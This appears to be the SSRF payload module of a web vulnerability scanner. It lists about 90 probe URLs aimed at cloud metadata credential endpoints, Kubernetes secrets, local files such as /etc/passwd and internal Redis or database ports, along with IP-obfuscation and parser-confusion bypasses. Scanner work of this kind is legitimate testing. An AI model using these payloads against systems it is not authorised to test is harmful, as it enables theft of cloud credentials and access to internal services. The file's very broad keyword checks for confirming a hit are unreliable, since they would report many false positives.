"""
scanner/payloads/ssrf.py

Server-Side Request Forgery (SSRF) payloads for vulnerability testing.
Covers: Internal network access, cloud metadata, protocol handlers,
IP obfuscation, DNS rebinding, URL parser confusion, and more.

Total: 60+ payloads across multiple categories.
"""

from .base import Payload


def ssrf_localhost_confirm(response_text: str) -> bool:
    """
    Check for localhost/internal access indicators.
    """
    indicators = [
        # Localhost indicators
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",

        # Local server indicators
        "apache",
        "nginx",
        "server at",
        "index of",
        "directory listing",

        # Common local services
        "phpinfo",
        "php version",
        "mysql",
        "redis",
        "memcached",
        "elasticsearch",
        "mongodb",

        # Internal web pages
        "admin",
        "dashboard",
        "internal",
        "intranet",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssrf_cloud_confirm(response_text: str) -> bool:
    """
    Check for cloud metadata access indicators.
    """
    indicators = [
        # AWS metadata
        "ami-id",
        "instance-id",
        "instance-type",
        "local-hostname",
        "local-ipv4",
        "public-hostname",
        "public-ipv4",
        "security-credentials",
        "iam",
        "ec2",

        # GCP metadata
        "computemetadata",
        "google-compute",
        "project-id",
        "numeric-project-id",
        "service-accounts",

        # Azure metadata
        "azure",
        "microsoft-azure",
        "subscription",
        "resourcegroup",

        # DigitalOcean metadata
        "droplet_id",
        "droplet-id",
        "floating_ip",

        # Alibaba Cloud metadata
        "alibaba",
        "ecs.aliyuncs",
        "region-id",

        # Oracle Cloud metadata
        "oracle",
        "opc-instance",
        "ocid",

        # Generic cloud
        "metadata",
        "169.254.169.254",
        "metadata.google",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssrf_kubernetes_confirm(response_text: str) -> bool:
    """
    Check for Kubernetes/Docker internal access indicators.
    """
    indicators = [
        # Kubernetes
        "kubernetes",
        "kube-system",
        "serviceaccount",
        "namespace",
        "pod",
        "apiversion",
        "kind:",
        "kubectl",
        "etcd",

        # Docker
        "docker",
        "container",
        "containers",
        "images",
        "volumes",

        # Service mesh
        "istio",
        "envoy",
        "linkerd",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssrf_error_confirm(response_text: str) -> bool:
    """
    Check for SSRF-related errors.
    """
    indicators = [
        # Connection errors (indicate SSRF attempt processed)
        "connection refused",
        "connection timed out",
        "failed to connect",
        "could not connect",
        "network unreachable",
        "no route to host",
        "name resolution failed",
        "dns lookup failed",

        # Protocol errors
        "invalid url",
        "malformed url",
        "unsupported protocol",
        "unknown protocol",
        "protocol error",

        # HTTP client errors
        "curl error",
        "urllib",
        "httplib",
        "requests.exceptions",
        "socket error",
        "gethostbyname",

        # SSRF-specific errors
        "ssrf",
        "blocked",
        "not allowed",
        "forbidden host",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssrf_redirect_confirm(response_text: str) -> bool:
    """
    Check for redirect-based SSRF indicators.
    """
    indicators = [
        "redirect",
        "location:",
        "moved",
        "302",
        "301",
        "307",
        "308",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssrf_confirm(response_text: str) -> bool:
    """Combined confirmation for SSRF."""
    return (ssrf_localhost_confirm(response_text) or
            ssrf_cloud_confirm(response_text) or
            ssrf_kubernetes_confirm(response_text) or
            ssrf_error_confirm(response_text) or
            ssrf_redirect_confirm(response_text))


SSRF_PAYLOADS = [
    # ============================================
    # LOCALHOST ACCESS - Basic
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Localhost HTTP",
        payload="http://127.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Localhost with port 80",
        payload="http://127.0.0.1:80",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Localhost with port 443",
        payload="https://127.0.0.1:443",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Localhost hostname",
        payload="http://localhost",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Zero IP",
        payload="http://0.0.0.0",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Localhost shorthand",
        payload="http://0",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),

    # ============================================
    # IP OBFUSCATION - Decimal
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Decimal IP localhost",
        payload="http://2130706433",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Decimal IP 10.0.0.1",
        payload="http://167772161",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Decimal IP metadata",
        payload="http://2852039166",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # IP OBFUSCATION - Hexadecimal
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Hex IP localhost",
        payload="http://0x7f000001",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Hex IP dotted localhost",
        payload="http://0x7f.0x0.0x0.0x1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Hex IP metadata",
        payload="http://0xa9fea9fe",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Hex IP mixed case",
        payload="http://0x7F.0x00.0x00.0x01",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),

    # ============================================
    # IP OBFUSCATION - Octal
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Octal IP localhost",
        payload="http://0177.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Octal IP full localhost",
        payload="http://0177.0000.0000.0001",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Octal IP metadata",
        payload="http://0251.0376.0251.0376",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # IP OBFUSCATION - IPv6 Variants
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="IPv6 localhost",
        payload="http://[::1]",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="IPv6 localhost full",
        payload="http://[0000:0000:0000:0000:0000:0000:0000:0001]",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="IPv6 mapped IPv4 localhost",
        payload="http://[::ffff:127.0.0.1]",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="IPv6 mapped IPv4 metadata",
        payload="http://[::ffff:169.254.169.254]",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="IPv6 compressed localhost",
        payload="http://[0:0:0:0:0:0:0:1]",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="IPv6 with zone ID",
        payload="http://[::1%25eth0]",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),

    # ============================================
    # DNS REBINDING PAYLOADS
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding localtest.me",
        payload="http://localtest.me",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding spoofed.burpcollaborator",
        payload="http://spoofed.burpcollaborator.net",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding 127.0.0.1.nip.io",
        payload="http://127.0.0.1.nip.io",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding vcap.me",
        payload="http://vcap.me",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding 127.0.0.1.xip.io",
        payload="http://127.0.0.1.xip.io",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DNS rebinding metadata.nip.io",
        payload="http://169.254.169.254.nip.io",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - AWS
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="AWS metadata base",
        payload="http://169.254.169.254/latest/meta-data/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="AWS IAM credentials",
        payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="AWS user data",
        payload="http://169.254.169.254/latest/user-data/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="AWS instance identity",
        payload="http://169.254.169.254/latest/dynamic/instance-identity/document",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="AWS IMDSv2 token endpoint",
        payload="http://169.254.169.254/latest/api/token",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - GCP
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="GCP metadata",
        payload="http://metadata.google.internal/computeMetadata/v1/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="GCP project metadata",
        payload="http://metadata.google.internal/computeMetadata/v1/project/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="GCP service accounts",
        payload="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="GCP access token",
        payload="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - Azure
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Azure metadata",
        payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Azure identity token",
        payload="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - DigitalOcean
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="DigitalOcean metadata v1",
        payload="http://169.254.169.254/metadata/v1/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DigitalOcean metadata id",
        payload="http://169.254.169.254/metadata/v1/id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="DigitalOcean user data",
        payload="http://169.254.169.254/metadata/v1/user-data",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - Alibaba Cloud
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Alibaba Cloud metadata",
        payload="http://100.100.100.200/latest/meta-data/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Alibaba Cloud instance id",
        payload="http://100.100.100.200/latest/meta-data/instance-id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Alibaba Cloud RAM credentials",
        payload="http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # CLOUD METADATA - Oracle Cloud
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Oracle Cloud metadata v1",
        payload="http://169.254.169.254/opc/v1/instance/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Oracle Cloud metadata v2",
        payload="http://169.254.169.254/opc/v2/instance/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Oracle Cloud identity",
        payload="http://169.254.169.254/opc/v1/identity/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # KUBERNETES/DOCKER INTERNAL ENDPOINTS
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Kubernetes API server",
        payload="https://kubernetes.default.svc",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Kubernetes API localhost",
        payload="https://127.0.0.1:6443",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Kubernetes API version",
        payload="https://kubernetes.default.svc/api/v1",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Kubernetes secrets",
        payload="https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Kubernetes service account token",
        payload="https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Docker API socket HTTP",
        payload="http://127.0.0.1:2375/v1.24/containers/json",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Docker API socket HTTPS",
        payload="https://127.0.0.1:2376/v1.24/containers/json",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Docker images list",
        payload="http://127.0.0.1:2375/images/json",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="etcd API",
        payload="http://127.0.0.1:2379/v2/keys/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Kubelet API",
        payload="https://127.0.0.1:10250/pods",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_kubernetes_confirm
    ),

    # ============================================
    # URL PARSER CONFUSION PAYLOADS
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="URL parser @ confusion",
        payload="http://evil.com@127.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser double @ confusion",
        payload="http://127.0.0.1#@evil.com",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL encoding double encode",
        payload="http://127.0.0.1%2523@evil.com",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser backslash confusion",
        payload="http://evil.com\\@127.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser tab injection",
        payload="http://127.0.0.1%09",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser CRLF injection",
        payload="http://127.0.0.1%0d%0a",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser unicode dot",
        payload="http://127\u30020\u30020\u30021",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL parser enclosed alphanumeric",
        payload="http://\u24db\u24de\u24d2\u24d0\u24db\u24d7\u24de\u24e2\u24e3",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),

    # ============================================
    # PROTOCOL SMUGGLING - Gopher
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Gopher protocol Redis INFO",
        payload="gopher://127.0.0.1:6379/_INFO",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Gopher protocol Redis KEYS",
        payload="gopher://127.0.0.1:6379/_KEYS%20*",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Gopher protocol MySQL",
        payload="gopher://127.0.0.1:3306/_",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Gopher protocol FastCGI",
        payload="gopher://127.0.0.1:9000/_",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Gopher protocol SMTP",
        payload="gopher://127.0.0.1:25/_HELO%20localhost",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),

    # ============================================
    # PROTOCOL SMUGGLING - Dict
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Dict protocol Redis INFO",
        payload="dict://127.0.0.1:6379/info",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Dict protocol Redis CONFIG",
        payload="dict://127.0.0.1:6379/config:get:*",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),

    # ============================================
    # PROTOCOL SMUGGLING - SFTP/SSH
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="SFTP protocol",
        payload="sftp://127.0.0.1:22",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="SSH protocol",
        payload="ssh://127.0.0.1:22",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),

    # ============================================
    # PROTOCOL SMUGGLING - Other
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="File protocol /etc/passwd",
        payload="file:///etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="File protocol Windows hosts",
        payload="file:///c:/windows/system32/drivers/etc/hosts",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="LDAP protocol",
        payload="ldap://127.0.0.1:389",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="TFTP protocol",
        payload="tftp://127.0.0.1:69/test",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Netdoc protocol",
        payload="netdoc:///etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Jar protocol",
        payload="jar:http://127.0.0.1!/",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),

    # ============================================
    # REDIRECT-BASED SSRF
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Redirect to localhost",
        payload="http://httpbin.org/redirect-to?url=http://127.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_redirect_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Redirect to metadata",
        payload="http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_redirect_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Redirect chain",
        payload="http://httpbin.org/redirect/3",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_redirect_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="URL shortener redirect",
        payload="http://tinyurl.com/localhost-redirect",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_redirect_confirm
    ),

    # ============================================
    # SNI-BASED PAYLOADS
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="SNI injection localhost",
        payload="https://127.0.0.1/",
        contexts=["url", "form", "header"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="SNI hostname mismatch",
        payload="https://evil.com@127.0.0.1/",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="SNI with metadata IP",
        payload="https://169.254.169.254/latest/meta-data/",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssrf_cloud_confirm
    ),

    # ============================================
    # INTERNAL NETWORK RANGES
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Internal 10.x",
        payload="http://10.0.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Internal 172.16.x",
        payload="http://172.16.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Internal 192.168.x",
        payload="http://192.168.0.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Internal 192.168.1.1 gateway",
        payload="http://192.168.1.1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),

    # ============================================
    # COMMON INTERNAL SERVICES
    # ============================================
    Payload(
        vuln_type="SSRF",
        name="Redis default port",
        payload="http://127.0.0.1:6379",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="MySQL default port",
        payload="http://127.0.0.1:3306",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="PostgreSQL default port",
        payload="http://127.0.0.1:5432",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Elasticsearch default port",
        payload="http://127.0.0.1:9200",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="MongoDB default port",
        payload="http://127.0.0.1:27017",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Memcached default port",
        payload="http://127.0.0.1:11211",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_error_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Consul API",
        payload="http://127.0.0.1:8500/v1/agent/self",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="CouchDB default port",
        payload="http://127.0.0.1:5984/_all_dbs",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="Apache Solr",
        payload="http://127.0.0.1:8983/solr/admin/cores",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
    Payload(
        vuln_type="SSRF",
        name="RabbitMQ management",
        payload="http://127.0.0.1:15672/api/overview",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssrf_localhost_confirm
    ),
]
